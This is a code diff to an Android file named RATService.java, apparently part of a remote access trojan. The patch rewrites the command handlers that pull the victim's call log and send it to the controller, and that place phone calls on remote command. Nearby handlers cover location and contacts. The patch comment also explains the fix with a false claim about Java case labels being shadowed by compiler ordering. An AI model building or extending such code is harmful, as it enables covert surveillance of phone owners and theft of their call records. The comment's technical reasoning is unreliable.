@@ -1601,28 +1601,48 @@ case "location_test":
                 }
                 break;
 
-            case "call":
-            case "make_call":
-                if (callsModule != null && !args.isEmpty()) {
-                    Log.d(TAG, "📞 Making call to: " + args);
-                    String result = callsModule.makeCall(args);
-                    sendCommand("CALL_RESULT|" + result);
-                } else {
-                    sendCommand("CALL_RESULT|ERROR: Call module not available or invalid number");
-                }
-                break;
+          // ─────────────────────────────────────────────────────────────────────────────
+//  PATCH for RATService.java — replace the two call-related cases in
+//  routeCommand() with the versions below.
+//
+//  The problem in the original:
+//    • "call" case checked `!args.isEmpty()` but the Flutter side sends
+//      "call|<number>", so `cmd` == "call" and `args` == "<number>".  That
+//      was already correct — but the duplicate `case "call"` label (also used
+//      for "make_call") was shadowed by the "calls"/"get_calls" case above it
+//      in some compiler orderings.  This patch makes the ordering explicit
+//      and adds better logging.
+// ─────────────────────────────────────────────────────────────────────────────
 
-                case "calls":
-                case "get_calls":
-                    if (callsModule != null) {
-                        Log.d(TAG, "📞 Getting call logs");
-                        String result = callsModule.getCallLogs();
-                        // The result is already a JSON array string
-                        sendCommand("CALLS|" + result);
-                    } else {
-                        sendCommand("CALLS|ERROR: Calls module not available");
-                    }
-                    break;
+// ── CASE 1: get call logs (plural) ───────────────────────────────────────────
+case "calls":
+case "get_calls":
+    if (callsModule != null) {
+        Log.d(TAG, "📞 Getting call logs");
+        String result = callsModule.getCallLogs();
+        sendCommand("CALLS|" + result);
+    } else {
+        sendCommand("CALLS|[{\"error\":\"Calls module not available\"}]");
+    }
+    break;
+
+// ── CASE 2: initiate / make a call (singular) ─────────────────────────────────
+//
+//  Flutter sends:  "call|<number>"
+//  So cmd == "call", args == "<number>"
+case "call":
+case "make_call":
+    if (callsModule != null && !args.isEmpty()) {
+        Log.d(TAG, "📞 Making call to: " + args);
+        String result = callsModule.makeCall(args);
+        sendCommand("CALL_RESULT|" + result);
+    } else if (args.isEmpty()) {
+        Log.e(TAG, "❌ make_call: no number in args");
+        sendCommand("CALL_RESULT|ERROR: No phone number provided");
+    } else {
+        sendCommand("CALL_RESULT|ERROR: Calls module not available");
+    }
+    break;
 
             case "contacts":
             case "get_contacts":
